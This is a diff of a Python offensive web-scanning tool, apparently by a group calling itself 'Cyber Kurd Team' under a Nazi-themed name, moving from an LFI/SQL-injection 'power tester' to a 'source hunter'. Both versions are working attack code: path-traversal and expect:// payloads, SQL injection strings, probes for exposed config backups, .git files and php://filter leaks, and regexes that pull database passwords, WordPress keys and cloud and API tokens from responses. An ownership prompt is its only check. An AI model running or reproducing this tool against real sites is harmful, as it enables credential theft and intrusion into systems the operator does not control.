@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# EYE OF NAZI v52.0 - POWER TESTER
+# EYE OF NAZI v53.0 - SOURCE HUNTER
 # Made by Cyber Kurd Team
 
-import sys, os, re, ssl, time, json
+import sys, os, re, ssl, time, json, base64
 import urllib.parse, urllib.request, urllib.error
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -17,163 +17,161 @@ LOGO = r"""
    ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[0m\033[93m\033[1m                    EYE OF NAZI
 \033[96m=============================================================\033[0m
-\033[97m\033[1m              POWER TESTER v52.0\033[0m
+\033[97m\033[1m              SOURCE HUNTER v53.0\033[0m
 \033[2m              Made by Cyber Kurd Team\033[0m
 \033[96m=============================================================\033[0m
 """
 
-LFI_PATHS = [
-    '../../../../../../etc/passwd',
-    '../../../../../../etc/shadow',
-    '../../../../../../etc/hosts',
-    '../../../../../../etc/hostname',
-    '../../../../../../etc/group',
-    '../../../../../../etc/apache2/apache2.conf',
-    '../../../../../../etc/nginx/nginx.conf',
-    '../../../../../../etc/php.ini',
-    '../../../../../../proc/self/environ',
-    '../../../../../../proc/self/cmdline',
-    '../../../../../../proc/version',
-    '../../../../../../proc/self/status',
-    '../../../../../../var/log/apache2/access.log',
-    '../../../../../../var/log/apache2/error.log',
-    '../../../../../../var/log/auth.log',
-    '../../../../../../var/log/syslog',
-    '../../../../../../var/log/messages',
-    '../../../../../../var/log/nginx/access.log',
-    '../../../../../../var/log/nginx/error.log',
-    '../../../../../../windows/win.ini',
-    '../../../../../../windows/system32/drivers/etc/hosts',
-    '../../../../../../boot.ini',
-    '..\\..\\..\\..\\..\\..\\windows\\win.ini',
-    '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-    '....//....//....//....//....//etc/passwd',
-    '....\\\\....\\\\....\\\\....\\\\....\\\\windows\\win.ini',
-    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
-    '..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
-    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-    '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
-    '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd',
-    'php://filter/convert.base64-encode/resource=index.php',
-    'php://filter/convert.base64-encode/resource=config.php',
-    'php://filter/read=convert.base64-encode/resource=config.php',
+# PHP source files to try to leak
+PHP_SOURCE_FILES = [
+    'wp-config.php',
+    'config.php',
+    'configuration.php',
+    'config.inc.php',
+    'settings.php',
+    'database.php',
+    'db.php',
+    'connect.php',
+    'connection.php',
+    'functions.php',
+    'includes/config.php',
+    'includes/db.php',
+    'admin/config.php',
+    'admin/config.inc.php',
+    'application/config.php',
+    'application/config/database.php',
+    'app/config.php',
+    'app/config/database.php',
+    'core/config.php',
+    'system/config.php',
+    'library/config.php',
+    'src/config.php',
+    'index.php',
+    'wp-load.php',
+    'wp-settings.php',
+    'wp-includes/functions.php',
+    'wp-includes/version.php',
+    'wp-content/themes/index.php',
+    'wp-admin/admin.php',
+    'wp-admin/setup-config.php',
+]
+
+# Backup files to try
+BACKUP_FILES = [
+    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
+    'wp-config.php.save', 'wp-config.php.orig', 'wp-config.php.txt',
+    'wp-config.php.swp', 'wp-config.php.swo', 'wp-config.txt',
+    'wp-config.php.copy', 'wp-config.php.backup',
+    '.wp-config.php.swp', '.#wp-config.php',
+    'config.php.bak', 'config.php~', 'config.php.old',
+    'config.php.save', 'config.php.orig', 'config.php.txt',
+    'config.php.swp', 'config.php.swo',
+    'configuration.php.bak', 'configuration.php~', 'configuration.php.old',
+    'config.inc.php.bak', 'config.inc.php~',
+    'settings.php.bak', 'settings.php~',
+    'database.php.bak', 'database.php~',
+    'db.php.bak', 'db.php~',
+    'index.php.bak', 'index.php~', 'index.php.old',
+    'index.php.save', 'index.php.orig', 'index.php.txt',
+    '.index.php.swp', '.index.php.swo',
+    'functions.php.bak', 'functions.php~',
+    '.env.bak', '.env.old', '.env.save', '.env.orig', '.env.copy',
+    '.env.backup', '.env.txt', '.env.example',
+    'config.json.bak', 'config.json~', 'config.json.old',
+    'config.yml.bak', 'config.yml~',
+    'config.yaml.bak', 'config.yaml~',
+    'settings.py.bak', 'settings.py~',
+    'database.yml.bak', 'database.yml~',
+    'phpinfo.php.bak', 'phpinfo.php~',
+    'info.php.bak', 'info.php~',
+    'test.php.bak', 'test.php~',
+    'debug.php.bak', 'debug.php~',
+    'readme.html.bak', 'readme.html~',
+    'README.md.bak', 'README.md~',
+    'license.txt.bak', 'license.txt~',
+    '.htaccess.bak', '.htaccess~', '.htaccess.old',
+    'web.config.bak', 'web.config~',
+    'nginx.conf.bak', 'nginx.conf~',
+    '.DS_Store', 'Thumbs.db', 'desktop.ini',
+]
+
+# Git exposure files
+GIT_FILES = [
+    '.git/config',
+    '.git/HEAD',
+    '.git/index',
+    '.git/logs/HEAD',
+    '.git/refs/heads/master',
+    '.git/refs/heads/main',
+    '.git/COMMIT_EDITMSG',
+    '.git/description',
+    '.git/info/exclude',
+    '.gitignore',
+    '.gitmodules',
+    '.gitattributes',
+    '.svn/entries',
+    '.svn/wc.db',
+    '.hg/hgrc',
+    '.hgignore',
+    '.bzr/branch/branch.conf',
+    '.git-credentials',
+    '.gitconfig',
+]
+
+# PHP filter paths
+PHP_FILTER_PATHS = [
     'php://filter/convert.base64-encode/resource=wp-config.php',
-    'php://filter/convert.base64-encode/resource=../config.php',
-    'php://filter/convert.base64-encode/resource=../../config.php',
-    'php://filter/convert.base64-encode/resource=/etc/passwd',
-    'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
-    'php://filter/read=string.rot13/resource=index.php',
-    'php://filter/read=string.toupper/resource=index.php',
+    'php://filter/convert.base64-encode/resource=config.php',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'php://filter/read=convert.base64-encode/resource=wp-config.php',
+    'php://filter/read=convert.base64-encode/resource=config.php',
+    'php://filter/convert.base64-encode/resource=../wp-config.php',
+    'php://filter/convert.base64-encode/resource=../../wp-config.php',
+    'php://filter/convert.base64-encode/resource=../../../wp-config.php',
+    'php://filter/convert.base64-encode/resource=settings.php',
+    'php://filter/convert.base64-encode/resource=database.php',
+    'php://filter/convert.base64-encode/resource=.env',
+    'php://filter/convert.base64-encode/resource=config.json',
+    'php://filter/convert.base64-encode/resource=config.yml',
+    'php://filter/read=string.rot13/resource=wp-config.php',
+    'php://filter/read=string.toupper/resource=wp-config.php',
+    'php://filter/read=string.tolower/resource=wp-config.php',
     'php://input',
     'php://stdin',
     'php://fd/1',
     'php://memory',
     'php://temp',
-    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
-    'data://text/plain,<?php phpinfo();?>',
-    'expect://id',
-    'expect://whoami',
-    'expect://ls',
-    'file:///etc/passwd',
-    'file:///c:/windows/win.ini',
-    '/etc/passwd',
-    '/etc/shadow',
-    '/etc/hosts',
-    '/proc/self/environ',
-    '/proc/self/cmdline',
-    '/var/log/apache2/access.log',
-    '/var/log/auth.log',
-    'C:\\windows\\win.ini',
-    'C:\\boot.ini',
-    'wp-config.php',
-    'config.php',
-    '.env',
-    'config.json',
-    'config.yml',
-    'database.yml',
-    'settings.py',
-    'settings.php',
-    'phpinfo.php',
-    'info.php',
-    'test.php',
 ]
 
-SQLI_PAYLOADS = [
-    "'",
-    "\"",
-    "'--",
-    "1' OR '1'='1",
-    "1' OR 1=1--",
-    "1' AND 1=1--",
-    "1' AND 1=2--",
-    "admin'--",
-    "admin'#",
-    "') OR ('1'='1",
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-    "1' ORDER BY 1--",
-    "1' ORDER BY 2--",
-    "1' ORDER BY 10--",
-    "1' ORDER BY 100--",
-    "1' GROUP BY 1--",
-    "1' HAVING 1=1--",
-    "' OR 'x'='x",
-    "1' AND SLEEP(3)--",
-    "1' AND SLEEP(3)#",
-    "1' AND PG_SLEEP(3)--",
-    "1'; WAITFOR DELAY '0:0:3'--",
-    "1' AND BENCHMARK(5000000,MD5('a'))--",
-    "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
-    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
-    "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
-    "1' AND 1=CONVERT(int,@@version)--",
-]
-
-SQL_ERRORS = [
-    "you have an error in your sql syntax",
-    "warning: mysql",
-    "unclosed quotation mark",
-    "quoted string not properly terminated",
-    "microsoft ole db provider for sql server",
-    "odbc sql server driver",
-    "sqlite3.operationalerror",
-    "pg_query()",
-    "psql:",
-    "postgresql",
-    "ora-01756",
-    "ora-00933",
-    "ora-00921",
-    "mysql_fetch_array()",
-    "supplied argument is not a valid mysql",
-    "column count doesn't match value count",
-    "unknown column",
-    "sqlstate",
-    "syntax error at or near",
-    "mariadb",
-    "division by zero",
-    "sqlite_",
-]
-
-CONFIG_PATHS = [
-    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
-    'wp-config.php.old', 'wp-config.php.save',
-    'config.php', 'config.php.bak', 'config.php~',
-    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
-    'settings.py', 'settings.php', 'settings.json',
-    'database.yml', 'database.php', '.env', '.env.local',
-    '.env.production', '.env.backup', '.env.dev',
-    '.htaccess', '.htpasswd', 'web.config',
-    'credentials.json', 'secrets.json', 'passwords.txt',
-    'wp-config-sample.php', 'config.old', 'config.backup',
-]
-
-PASSWORD_PATTERNS = [
+# Password patterns
+PASS_PATTERNS = [
+    r'define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_CHARSET[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]AUTH_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]SECURE_AUTH_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]LOGGED_IN_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]NONCE_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]AUTH_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]SECURE_AUTH_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]LOGGED_IN_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]NONCE_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]WP_HOME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]WP_SITEURL[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]WP_DEBUG[\'"]\s*,\s*([a-z]+)',
+    r'define\s*\(\s*[\'"]TABLE_PREFIX[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'DB_NAME\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'DB_USER\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'DB_PASSWORD\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'DB_HOST\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'database\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'username\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'password\s*=\s*[\'"]([^\'"]+)[\'"]',
+    r'host\s*=\s*[\'"]([^\'"]+)[\'"]',
     r'password["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
-    r'pwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'token["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
@@ -194,28 +192,10 @@ PASSWORD_PATTERNS = [
     r'APP_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'APP_SECRET\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
     r'SECRET_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
-    r'AWS_SECRET[_-]?ACCESS[_-]?KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
-    r'AWS_ACCESS[_-]?KEY[_-]?ID\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
-    r'db_password\s*=\s*["\']([^"\'\s]{4,80})["\']',
-    r'db_pass\s*=\s*["\']([^"\'\s]{4,80})["\']',
-    r'db_user\s*=\s*["\']([^"\'\s]{4,80})["\']',
-    r'db_name\s*=\s*["\']([^"\'\s]{4,80})["\']',
-    r'DB_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
     r'AKIA[0-9A-Z]{16}',
     r'ghp_[0-9a-zA-Z]{36}',
     r'sk_live_[0-9a-zA-Z]{24,}',
     r'AIza[0-9A-Za-z\-_]{35}',
-]
-
-DB_PATTERNS = [
-    r'DB_NAME["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'DB_USER["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'DB_PASSWORD["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'DB_HOST["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'database["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'username["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
-    r'host["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
 ]
 
 
@@ -226,7 +206,7 @@ class Client:
         self.proxy = proxy
         self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"
 
-    def req(self, url, data=None, method=None):
+    def req(self, url):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -238,7 +218,7 @@ class Client:
         hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
         if self.cookie:
             hdrs['Cookie'] = self.cookie
-        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
+        r = urllib.request.Request(url, headers=hdrs)
         t0 = time.time()
         try:
             rp = op.open(r, timeout=self.timeout)
@@ -256,176 +236,144 @@ class Client:
             return {'s': 0, 't': '', 'n': 0, 'dt': time.time() - t0, 'err': str(e)}
 
 
-class Tester:
+class Hunter:
     def __init__(self, url, cl, threads=20):
         self.url = url.rstrip('/')
         self.cl = cl
         self.threads = threads
         self.findings = []
         self.passwords = []
-        self.databases = []
-        self.files = []
+        self.source = []
 
-    def add(self, url, kind, evidence, severity="HIGH"):
+    def add(self, url, kind, evidence, severity="CRITICAL"):
         self.findings.append({'url': url, 'type': kind,
                               'evidence': evidence[:300], 'severity': severity})
         icons = {
-            'LFI': '\033[95m[LFI]\033[0m',
-            'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
+            'SOURCE': '\033[95m[SOURCE]\033[0m',
+            'BACKUP': '\033[92m[BACKUP]\033[0m',
+            'GIT': '\033[41m\033[97m[GIT]\033[0m',
             'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
-            'DATABASE': '\033[41m\033[97m[DATABASE]\033[0m',
-            'FILE': '\033[92m[FILE]\033[0m',
-            'CONFIG': '\033[93m[CONFIG]\033[0m',
+            'FILTER': '\033[93m[FILTER]\033[0m',
         }
         icon = icons.get(kind, '[' + kind + ']')
         print("\n  " + icon + " \033[1m" + severity + "\033[0m")
         print("    URL     : " + url[:120])
         print("    Evidence: " + evidence[:250])
 
-    def inject_url(self, url, param, payload):
-        pr = urllib.parse.urlparse(url)
-        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
-        qs[param] = [payload]
-        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
-                                         pr.params,
-                                         urllib.parse.urlencode(qs, doseq=True),
-                                         pr.fragment))
-
-    def params(self, url):
-        q = urllib.parse.urlparse(url).query
-        if not q:
-            return []
-        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())
-
-    def test_lfi(self, url):
-        print("\n\033[96m[1/5]\033[0m LFI Testing...")
-        params = self.params(url)
-        if not params:
-            print("  \033[93m[!]\033[0m No URL parameters to test")
-            return
-        tested = 0
-        for param in params:
-            for path in LFI_PATHS[:30]:
-                test_url = self.inject_url(url, param, path)
-                r = self.cl.req(test_url)
-                tested += 1
-                if r['err']:
-                    continue
-                indicators = ['root:x:0:0', 'daemon:x:', 'bin:x:', 'www-data:',
-                              '[extensions]', '[fonts]', '[boot loader]',
-                              'for 16-bit app support']
-                for ind in indicators:
-                    if ind in r['t']:
-                        self.add(test_url, 'LFI',
-                                 "File leaked: " + ind, "CRITICAL")
-                        self.files.append({'url': test_url, 'path': path,
-                                           'indicator': ind})
-                        break
-        print("  \033[92m[+]\033[0m Tested " + str(tested) + " payloads")
-
-    def test_sqli(self, url):
-        print("\n\033[96m[2/5]\033[0m SQLi Testing...")
-        params = self.params(url)
-        if not params:
-            print("  \033[93m[!]\033[0m No URL parameters to test")
-            return
-        tested = 0
-        for param in params:
-            base = self.cl.req(url)
-            b = base['t'] if not base['err'] else ''
-            for payload in SQLI_PAYLOADS:
-                test_url = self.inject_url(url, param, payload)
-                r = self.cl.req(test_url)
-                tested += 1
-                if r['err']:
-                    continue
-                found = False
-                for err in SQL_ERRORS:
-                    if err in r['t'].lower():
-                        self.add(test_url, 'SQLI',
-                                 "DB error: " + err, "CRITICAL")
-                        found = True
-                        break
-                if found:
-                    break
-                if 'sleep' in payload.lower() and r['dt'] > 2.5:
-                    self.add(test_url, 'SQLI',
-                             "Time delay: " + str(round(r['dt'], 2)) + "s",
-                             "CRITICAL")
-                    break
-        print("  \033[92m[+]\033[0m Tested " + str(tested) + " payloads")
-
-    def test_config(self, url):
-        print("\n\033[96m[3/5]\033[0m Config Files...")
-        tested = 0
-        for path in CONFIG_PATHS:
-            full = url.rstrip('/') + '/' + path
-            r = self.cl.req(full)
-            tested += 1
-            if r['err'] or r['s'] != 200:
-                continue
-            self.add(full, 'CONFIG',
-                     "Config file exposed (" + str(r['n']) + "B)", "CRITICAL")
-
-    def extract_passwords(self, url):
-        print("\n\033[96m[4/5]\033[0m Password Extraction...")
+    def test_php_source(self):
+        print("\n\033[96m[1/5]\033[0m PHP Source Leak...")
         found = 0
-        for path in CONFIG_PATHS:
-            full = url.rstrip('/') + '/' + path
+        for path in PHP_SOURCE_FILES:
+            full = self.url + '/' + path
             r = self.cl.req(full)
             if r['err'] or r['s'] != 200:
                 continue
-            text = r['t']
-            for pat in PASSWORD_PATTERNS:
+            if r['n'] > 0 and ('<?php' in r['t'] or 'define(' in r['t']
+                               or 'DB_' in r['t'] or '$' in r['t'][:200]):
+                self.add(full, 'SOURCE',
+                         "PHP source leaked (" + str(r['n']) + "B)",
+                         "CRITICAL")
+                self.source.append({'url': full, 'content': r['t'][:500]})
+                found += 1
+        print("  \033[92m[+]\033[0m Found " + str(found) + " PHP source file(s)")
+
+    def test_backup(self):
+        print("\n\033[96m[2/5]\033[0m Backup Files...")
+        found = 0
+        for path in BACKUP_FILES:
+            full = self.url + '/' + path
+            r = self.cl.req(full)
+            if r['err'] or r['s'] != 200:
+                continue
+            if r['n'] > 0:
+                self.add(full, 'BACKUP',
+                         "Backup exposed (" + str(r['n']) + "B)",
+                         "CRITICAL")
+                found += 1
+        print("  \033[92m[+]\033[0m Found " + str(found) + " backup file(s)")
+
+    def test_git(self):
+        print("\n\033[96m[3/5]\033[0m Git Exposure...")
+        found = 0
+        for path in GIT_FILES:
+            full = self.url + '/' + path
+            r = self.cl.req(full)
+            if r['err'] or r['s'] != 200:
+                continue
+            if r['n'] > 0:
+                self.add(full, 'GIT',
+                         "Git exposed (" + str(r['n']) + "B)",
+                         "CRITICAL")
+                found += 1
+        print("  \033[92m[+]\033[0m Found " + str(found) + " git file(s)")
+
+    def test_php_filter(self):
+        print("\n\033[96m[4/5]\033[0m PHP Filter...")
+        found = 0
+        for path in PHP_FILTER_PATHS:
+            full = self.url + '/' + path
+            r = self.cl.req(full)
+            if r['err'] or r['s'] != 200:
+                continue
+            if r['n'] > 0:
+                self.add(full, 'FILTER',
+                         "PHP filter worked (" + str(r['n']) + "B)",
+                         "CRITICAL")
+                found += 1
+        print("  \033[92m[+]\033[0m Found " + str(found) + " filter")
+
+    def extract_passwords(self):
+        print("\n\033[96m[5/5]\033[0m Password Extraction...")
+        found = 0
+        # From PHP source
+        for item in self.source:
+            text = item['content']
+            for pat in PASS_PATTERNS:
                 try:
                     for m in re.findall(pat, text, re.IGNORECASE):
                         if isinstance(m, tuple):
                             for x in m:
-                                if x and 4 <= len(x) <= 80:
-                                    self.passwords.append({'url': full,
-                                                           'password': x})
-                                    self.add(full, 'PASSWORD',
-                                             "Password: " + x, "CRITICAL")
+                                if x and 2 <= len(x) <= 200:
+                                    self.passwords.append({'url': item['url'],
+                                                           'value': x})
+                                    self.add(item['url'], 'PASSWORD',
+                                             x, "CRITICAL")
                                     found += 1
-                        elif m and 4 <= len(m) <= 80:
-                            self.passwords.append({'url': full, 'password': m})
-                            self.add(full, 'PASSWORD',
-                                     "Password: " + m, "CRITICAL")
+                        elif m and 2 <= len(m) <= 200:
+                            self.passwords.append({'url': item['url'],
+                                                   'value': m})
+                            self.add(item['url'], 'PASSWORD',
+                                     m, "CRITICAL")
                             found += 1
                 except Exception:
                     pass
-        print("  \033[92m[+]\033[0m Found " + str(found) + " password(s)")
-
-    def extract_database(self, url):
-        print("\n\033[96m[5/5]\033[0m Database Extraction...")
-        found = 0
-        for path in CONFIG_PATHS:
-            full = url.rstrip('/') + '/' + path
+        # From backup files
+        for path in BACKUP_FILES[:50]:
+            full = self.url + '/' + path
             r = self.cl.req(full)
             if r['err'] or r['s'] != 200:
                 continue
             text = r['t']
-            db_info = {}
-            for pat in DB_PATTERNS:
+            for pat in PASS_PATTERNS:
                 try:
                     for m in re.findall(pat, text, re.IGNORECASE):
-                        if m:
-                            if isinstance(m, tuple):
-                                for x in m:
-                                    if x and len(x) > 1:
-                                        db_info.setdefault('values', []).append(x)
-                            else:
-                                db_info.setdefault('values', []).append(m)
+                        if isinstance(m, tuple):
+                            for x in m:
+                                if x and 2 <= len(x) <= 200:
+                                    self.passwords.append({'url': full,
+                                                           'value': x})
+                                    self.add(full, 'PASSWORD',
+                                             x, "CRITICAL")
+                                    found += 1
+                        elif m and 2 <= len(m) <= 200:
+                            self.passwords.append({'url': full,
+                                                   'value': m})
+                            self.add(full, 'PASSWORD',
+                                     m, "CRITICAL")
+                            found += 1
                 except Exception:
                     pass
-            if db_info:
-                vals = list(set(db_info.get('values', [])))[:10]
-                if vals:
-                    self.databases.append({'url': full, 'values': vals})
-                    self.add(full, 'DATABASE',
-                             "DB info: " + ", ".join(vals[:5]), "CRITICAL")
-                    found += 1
-        print("  \033[92m[+]\033[0m Found " + str(found) + " database info")
+        print("  \033[92m[+]\033[0m Found " + str(found) + " password(s)")
 
     def run(self):
         print("\n\033[96m" + "=" * 60 + "\033[0m")
@@ -433,48 +381,46 @@ class Tester:
         print("\033[96m" + "=" * 60 + "\033[0m")
 
         try:
-            self.test_lfi(self.url)
+            self.test_php_source()
         except Exception as e:
             print("  \033[91m[!]\033[0m " + str(e))
 
         try:
-            self.test_sqli(self.url)
+            self.test_backup()
         except Exception as e:
             print("  \033[91m[!]\033[0m " + str(e))
 
         try:
-            self.test_config(self.url)
+            self.test_git()
         except Exception as e:
             print("  \033[91m[!]\033[0m " + str(e))
 
         try:
-            self.extract_passwords(self.url)
+            self.test_php_filter()
         except Exception as e:
             print("  \033[91m[!]\033[0m " + str(e))
 
         try:
-            self.extract_database(self.url)
+            self.extract_passwords()
         except Exception as e:
             print("  \033[91m[!]\033[0m " + str(e))
 
         print("\n\033[96m" + "=" * 60 + "\033[0m")
         print("  Total Findings: \033[1m\033[91m" + str(len(self.findings)) + "\033[0m")
-        print("  Files: " + str(len(self.files)))
+        print("  Source Files: " + str(len(self.source)))
         print("  Passwords: " + str(len(self.passwords)))
-        print("  Databases: " + str(len(self.databases)))
         print("\033[96m" + "=" * 60 + "\033[0m\n")
 
         if not self.findings:
-            print("  \033[92mNo vulnerabilities found.\033[0m\n")
+            print("  \033[92mNo findings.\033[0m\n")
 
     def save_json(self, filename):
         with open(filename, 'w', encoding='utf-8') as fp:
             json.dump({
                 'target': self.url,
                 'findings': self.findings,
-                'files': self.files,
                 'passwords': self.passwords,
-                'databases': self.databases,
+                'source_count': len(self.source),
             }, fp, indent=2, ensure_ascii=False)
         print("\033[92m[+]\033[0m Saved: " + filename)
 
@@ -490,7 +436,7 @@ def is_url(text):
 def main():
     print(LOGO)
     print("\n\033[96m" + "=" * 60 + "\033[0m")
-    print("\033[92m  Power Tester - Type a domain (your own site).\033[0m")
+    print("\033[92m  Source Hunter - Type your own site domain.\033[0m")
     print("\033[93m  Warning: Use only on YOUR OWN site!\033[0m")
     print("\033[96m" + "=" * 60 + "\033[0m\n")
 
@@ -541,14 +487,14 @@ def main():
                 st['last'].save_json(arg)
         elif is_url(cmd):
             url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
-            print("\n\033[93m[!]\033[0m Warning: Only use on YOUR OWN site!")
+            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
             print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
             conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
             if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                 print("\033[93m[!] Aborted.\033[0m")
                 continue
-            cl = Client(timeout=15, cookie=st['cookie'], proxy=st['proxy'])
-            sc = Tester(url, cl, threads=st['threads'])
+            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
+            sc = Hunter(url, cl, threads=st['threads'])
             try:
                 sc.run()
                 st['last'] = sc
